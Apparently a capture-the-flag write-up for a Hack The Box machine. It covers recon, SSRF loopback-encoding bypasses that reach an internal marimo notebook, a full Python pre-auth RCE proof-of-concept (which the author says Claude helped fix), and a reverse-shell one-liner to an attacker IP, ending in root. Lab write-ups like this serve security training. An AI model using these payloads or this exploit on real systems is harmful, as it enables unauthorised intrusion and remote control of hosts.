### Nmap
```
nmap -sV -sC -vv 10.129.3.149

---OUTPUT---
Nmap scan report for 10.129.3.149
Host is up, received echo-reply ttl 63 (0.11s latency).
Scanned at 2026-08-03 05:43:19 EDT for 23s
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp  open  http     syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://cohort.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp open  ssl/http syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
| Issuer: commonName=cohort.htb/organizationName=Cohort Analytics
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-01T18:47:07
| Not valid after:  2126-05-08T18:47:07
| MD5:     2e50 cc1d 45e6 73fd 12c5 9e21 82f2 c0ae
| SHA-1:   7e85 23e7 63eb 6541 a236 a388 fdc5 2514 8ca9 8e8c
| SHA-256: b5a8 18c7 eb3c 1923 8381 2665 afcb 2e69 85e7 b6f4 84e2 5378 205d b746 e58c b39f
| -----BEGIN CERTIFICATE-----
| MIIDaDCCAlCgAwIBAgIUcO2V21Ijt3F8k9BT8lRtCdpBaMowDQYJKoZIhvcNAQEL
| BQAwMDEZMBcGA1UECgwQQ29ob3J0IEFuYWx5dGljczETMBEGA1UEAwwKY29ob3J0
| Lmh0YjAgFw0yNjA2MDExODQ3MDdaGA8yMTI2MDUwODE4NDcwN1owMDEZMBcGA1UE
| CgwQQ29ob3J0IEFuYWx5dGljczETMBEGA1UEAwwKY29ob3J0Lmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAI3Ug35PR2gUsdEyzT9owy89VEy4FGTr
| bWvwqb0sOTXKB5Sr0kU3vG6qV6mPhSuZExCAGySU9JTQNzNit6+EHoePqUyfSp5I
| jRRMQqX9ZoFQEO3B+47fXaUBk0HwOrTKOvWyWp7u827rjnPGi5GHfzYCRtlTNEiS
| JVNcb7hHQGMuhhGuLhWQZutV91moixFPPGcKuNJ4XTzQh9Hf2+aYfcdWRGaaJRAE
| wqN1TYKsLvkh3U9MEuvWRgC1MvliLwLrofb3h49anlnzztnX0CNQq35V3wpvMnF2
| B/mobKvfaXoGk5dOYUiHtQ1RNDzGUiRF8v32XEkq9P09fEbK/9waoNsCAwEAAaN4
| MHYwHQYDVR0OBBYEFDWDIUl+ylzJHRBJ5gwUS885lzknMB8GA1UdIwQYMBaAFDWD
| IUl+ylzJHRBJ5gwUS885lzknMA8GA1UdEwEB/wQFMAMBAf8wIwYDVR0RBBwwGoIK
| Y29ob3J0Lmh0YoIMKi5jb2hvcnQuaHRiMA0GCSqGSIb3DQEBCwUAA4IBAQAzZZLv
| 8IYaAbk+wy769gS5F27BXwBDCx/a+mVXpkV1DeVqmnplcKATFfFSMvcArRTBh0nR
| cNJpFTpDCmJPritZ8sSvaai10i8wb/n67MNwSs4qdjgfQlMHurS7BkYfYOfYfL2s
| BtYvOZEMfTIU4lXN/ZqPewuxxzhh/tEEfjmeJg8X45xVAILYQkYYpRe4GS7PkC+R
| SDrTEh5mNQ2HrGI28Ku22l6n2gzz5egPL/7fiL6/6QaobwmFOICon52UcTTIc/ff
| vs+rApxVr0JDcytHyULfCTyAf+99O/lLP1Fwb8Iy1Bni55ACCMh7Q8BDuD9fPlmb
| cUEVVpToHF1kC9vP
|_-----END CERTIFICATE-----
|_http-title: Did not follow redirect to https://cohort.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Checking the browser its a website that takes files as input for analytics:
![[Pasted image 20260803060335.png]]

- I initally test if it reaches my server and it does. I also see we can input parquet files which had a CVE related to it for RCE (however I guess this is a rabbit hole)

- Checking gobuster I find a Forbidden error:
```
gobuster dir -u https://cohort.htb/ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-tls-validation --exclude-length 908
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://cohort.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          908
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
assets               (Status: 301) [Size: 178] [--> https://cohort.htb/assets/]
status               (Status: 403) [Size: 162]
api                  (Status: 301) [Size: 178] [--> https://cohort.htb/api/]
```
![[Pasted image 20260803060438.png]]

- I pass this url onto the analytics page and get an interesting output:
![[Pasted image 20260803060516.png]]
```
---BURP-REQUEST---
POST /api/validate HTTP/1.1
Host: cohort.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://cohort.htb/portal.html
Content-Type: application/json
Content-Length: 50
Origin: https://cohort.htb
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"url":"https://cohort.htb/status","format":"csv"}

---BURP-RESPONSE---
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Mon, 03 Aug 2026 10:02:52 GMT
Content-Type: application/json
Content-Length: 548
Connection: keep-alive

{"ok": true, "fetched_status": 200, "content_type": "application/json", "preview": "{\"service\":\"cohort-edge\",\"status\":\"ok\",\"generated_by\":\"nginx\",\"upstreams\":[{\"name\":\"marketing\",\"host\":\"cohort.htb\",\"root\":\"/var/www/cohort\"},{\"name\":\"insights-api\",\"host\":\"cohort.htb\",\"path\":\"/api/\",\"target\":\"127.0.0.1:5000\"},{\"name\":\"notebooks\",\"host\":\"nb-1be3782a8afd3ad5.cohort.htb\",\"target\":\"127.0.0.1:8888\",\"note\":\"internal analyst workspace, not for external use\"}]}", "message": "Source reachable."}
```
![[Pasted image 20260803060558.png]]

- I see a workspace running internally on port 888 (and another marketing running on port 5000)
- Trying to access it I initally get a denied to access internal services but with a bypass I managed to 
```
---BURP-REQUEST---
POST /api/validate HTTP/1.1
Host: cohort.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://cohort.htb/portal.html
Content-Type: application/json
Content-Length: 58
Origin: https://cohort.htb
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"url":"http://[0:0:0:0:0:ffff:127.0.0.1]","format":"csv"}

---BURP-RESPONSE---
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Mon, 03 Aug 2026 10:08:36 GMT
Content-Type: application/json
Content-Length: 1077
Connection: keep-alive

{"ok": true, "fetched_status": 200, "content_type": "text/html", "preview": "<!doctype html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>Cohort Analytics</title>\n<meta name=\"description\" content=\"Cohort Analytics - retention intelligence for subscription teams.\">\n<link rel=\"stylesheet\" href=\"/assets/styles.css\">\n</head>\n<body>\n<div id=\"app\" data-page=\"home\" aria-busy=\"true\">\n  <div class=\"boot\"><span class=\"boot-mark\" aria-hidden=\"true\"></span><span>Loading Cohort Analytics</span></div>\n</div>\n<noscript>\n  <div style=\"max-width:640px;margin:18vh auto;padding:0 24px;font-family:system-ui,sans-serif;color:#15181d;text-align:center;\">\n    <h1 style=\"font-size:1.4rem;\">JavaScript required</h1>\n    <p style=\"color:#4a5159;\">The Cohort Analytics workspace runs in your browser. Please enable JavaScript to continue.</p>\n  </div>\n</noscript>\n<script src=\"/assets/app.js\" defer></script>\n</body>\n</html>\n", "message": "Source reachable."}
```
![[Pasted image 20260803061055.png]]
![[Pasted image 20260803061109.png]]

- It asks for Javarscript but with this other bypass I get some more information about an Access Token:
```
---BURP-REQUEST---
POST /api/validate HTTP/1.1
Host: cohort.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://cohort.htb/portal.html
Content-Type: application/json
Content-Length: 38
Origin: https://cohort.htb
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"url":"http://0:8888","format":"csv"}
--OR--
{"url":"http://127.0.1:8888","format":"csv"}
--OR---
{"url":"http://127.1:8888","format":"csv"}

---BURP-RESPONSE---
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Mon, 03 Aug 2026 10:16:15 GMT
Content-Type: application/json
Content-Length: 1515
Connection: keep-alive

{"ok": true, "fetched_status": 200, "content_type": "text/html; charset=utf-8", "preview": "\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<title>marimo</title>\n</head>\n<body style=\"\n    background-color: #f4f4f9;\n    display: flex;\n    justify-content: center;\n    align-items: center;\n    height: 100vh;\n    margin: 0;\">\n  <form method=\"POST\" action=\"/auth/login\" style=\"\n    padding: 20px;\n    background-color: white;\n    border-radius: 8px;\n    box-shadow: 0 4px 8px rgba(0,0,0,0.1);\n    width: 300px;\n    text-align: center;\">\n    <div style=\"margin-bottom: 20px;\">\n      <label for=\"password\" style=\"\n        display: block;\n        margin-bottom: 5px;\n        font-size: 16px;\n        font-family: Arial, sans-serif;\n        color: #333;\">Access Token / Password</label>\n      <input id=\"password\" name=\"password\" type=\"password\" style=\"\n        width: 100%;\n        box-sizing: border-box;\n        padding: 8px;\n        border: 1px solid #ccc;\n        border-radius: 4px;\">\n    </div>\n    <button type=\"submit\" style=\"\n        background-color: #1C7362;\n        color: white;\n        padding: 10px 20px;\n        border: none;\n        border-radius: 4px;\n        cursor: pointer;\n        width: 100%;\n        font-size: 16px;\">Login</button>\n    <p style=\"color: red;\"></p>\n  </form>\n</body>\n</html>\n", "message": "Source reachable."}
```

![[Pasted image 20260803061741.png]]

![[Pasted image 20260803061820.png]]

- I can also check the api endpoints to find some more info like the version:
```
---BURP-REQUEST---
POST /api/validate HTTP/1.1
Host: cohort.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://cohort.htb/portal.html
Content-Type: application/json
Content-Length: 55
Origin: https://cohort.htb
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"url":"http://127.1:8888/api/version","format":"json"}

---BURP-RESPONSE----
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Mon, 03 Aug 2026 10:22:22 GMT
Content-Type: application/json
Content-Length: 133
Connection: keep-alive

{"ok": true, "fetched_status": 200, "content_type": "text/plain; charset=utf-8", "preview": "0.20.4", "message": "Source reachable."}
```

```
---BURP-REQUEST---
POST /api/validate HTTP/1.1
Host: cohort.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://cohort.htb/portal.html
Content-Type: application/json
Content-Length: 53
Origin: https://cohort.htb
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"url":"http://127.1:5000/api/health","format":"csv"}

---OUTPUT---
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Mon, 03 Aug 2026 10:22:41 GMT
Content-Type: application/json
Content-Length: 166
Connection: keep-alive

{"ok": true, "fetched_status": 200, "content_type": "application/json", "preview": "{\"ok\": true, \"service\": \"cohort-insights\"}", "message": "Source reachable."}
```

- Searching online for `notebook 0.20.4 exploit` I find an exploit for `Marimo` for versions under 0.25.5. This leads me to CVE-2026-39987 which leads me to this PoC: github.com/jasonbernier/CVE-2026-39987
- However this was released ecently. I found an earlier PoC which was initially failing but with Claude i fixed it to be below: github.com/fevar54/marimo_CVE-2026-39987_RCE_PoC
```
#!/usr/bin/env python3

"""

CVE-2026-39987 - Marimo < 0.23.0 Pre-Auth RCE (WebSocket)

Fixed PoC - sends raw pty input over /terminal/ws instead of a JSON exec envelope.

Uso: python marimo_poc_fixed.py -u <target> -c "<command>"

"""

import asyncio

import sys

import argparse

from urllib.parse import urlparse, urljoin

import ssl

import warnings

import websockets

import requests

warnings.filterwarnings("ignore")

class Colors:

RED = '\033[91m'

GREEN = '\033[92m'

YELLOW = '\033[93m'

CYAN = '\033[96m'

WHITE = '\033[97m'

BOLD = '\033[1m'

END = '\033[0m'

def print_banner():

print(f"""

{Colors.RED}{Colors.BOLD}

================================================================

CVE-2026-39987 - Marimo Pre-Auth RCE (WebSocket) - fixed PoC

================================================================

{Colors.END}

""")

def check_target(target_url):

"""Best-effort version check. Non-fatal if it can't confirm anything."""

print(f"{Colors.CYAN}[*] Checking target /api/version ...{Colors.END}")

try:

r = requests.get(urljoin(target_url + "/", "api/version"), timeout=8, verify=False)

if r.status_code == 200 and r.text.strip():

print(f"{Colors.GREEN}[+] Version reported: {r.text.strip()}{Colors.END}")

else:

print(f"{Colors.YELLOW}[!] /api/version returned status {r.status_code}, continuing anyway{Colors.END}")

except Exception as e:

print(f"{Colors.YELLOW}[!] Could not reach /api/version ({e}), continuing anyway{Colors.END}")

async def drain(websocket, quiet_seconds=1.0):

"""Read frames until the socket goes quiet for quiet_seconds, instead of trusting a single recv()."""

output = ""

while True:

try:

chunk = await asyncio.wait_for(websocket.recv(), timeout=quiet_seconds)

if isinstance(chunk, bytes):

chunk = chunk.decode(errors="replace")

output += chunk

except asyncio.TimeoutError:

break

except Exception:

break

return output

async def handle_connection(websocket, command, interactive):

# Drain the initial banner/prompt burst first — this is pty output, not a JSON welcome message.

banner = await drain(websocket, quiet_seconds=1.5)

if banner:

print(f"{Colors.CYAN}[*] Initial output:{Colors.END}\n{banner}")

if interactive:

print(f"\n{Colors.GREEN}{Colors.BOLD}[+] Interactive shell — type 'exit' to quit{Colors.END}\n")

while True:

cmd = input(f"{Colors.GREEN}marimo-shell>{Colors.END} ").strip()

if cmd.lower() in ("exit", "quit"):

break

if not cmd:

continue

# Raw pty input, not JSON — this is the actual fix.

await websocket.send(cmd + "\n")

out = await drain(websocket, quiet_seconds=1.5)

print(out)

return True

else:

print(f"{Colors.CYAN}[*] Executing: {command}{Colors.END}")

await websocket.send(command + "\n")

out = await drain(websocket, quiet_seconds=2.0)

print(f"\n{Colors.GREEN}[+] Output:{Colors.END}")

print(f"{Colors.WHITE}{'='*60}{Colors.END}")

print(out)

print(f"{Colors.WHITE}{'='*60}{Colors.END}")

return True

async def exploit_websocket(target_url, command, interactive=False):

parsed = urlparse(target_url)

ssl_context = None

if parsed.scheme == 'https':

ws_scheme = 'wss'

ssl_context = ssl.create_default_context()

ssl_context.check_hostname = False

ssl_context.verify_mode = ssl.CERT_NONE

else:

ws_scheme = 'ws'

ws_url = f"{ws_scheme}://{parsed.netloc}/terminal/ws"

print(f"{Colors.CYAN}[*] Connecting to {ws_url} ...{Colors.END}")

try:

async with websockets.connect(ws_url, ssl=ssl_context) as ws:

return await handle_connection(ws, command, interactive)

except Exception as e:

print(f"{Colors.RED}[-] Error: {e}{Colors.END}")

return False

def main():

parser = argparse.ArgumentParser(description='CVE-2026-39987 Marimo Pre-Auth RCE (fixed PoC)')

parser.add_argument('-u', '--url', required=True, help='Target URL, e.g. https://host')

parser.add_argument('-c', '--command', default=None, help='Command to execute')

parser.add_argument('-i', '--interactive', action='store_true', help='Interactive shell mode')

parser.add_argument('--no-check', action='store_true', help='Skip the /api/version check')

args = parser.parse_args()

print_banner()

target = args.url if args.url.startswith(('http://', 'https://')) else 'http://' + args.url

target = target.rstrip('/')

if not args.no_check:

check_target(target)

if not args.interactive and not args.command:

parser.print_help()

sys.exit(1)

asyncio.run(exploit_websocket(target, args.command, args.interactive))

if __name__ == "__main__":

main()
```

- Then getting a shell would not persist so I used this exploit instead:
```
python3 poc.py -u https://nb-1be3782a8afd3ad5.cohort.htb -c 'setsid bash -c "bash -i >& /dev/tcp/10.10.16.170/9999 0>&1" </dev/null >/dev/null 2>&1 &'
```

- I get a shell:
![[Pasted image 20260803090716.png]]

- I grab user flag:
![[Pasted image 20260803090959.png]]

### Privilege Escalation
- Using the ***LATEST*** linpeas i check and find the vulnerability:
![[Pasted image 20260803091203.png]]

- Points to Pack2TheRoot exploit https://github.com/shibaaa204/Pack2TheRoot
	- CVE-2026-41651
- I run the exploit on the target and get root:
![[Pasted image 20260803091458.png]]

- Grab the root flag:
![[Pasted image 20260803091543.png]]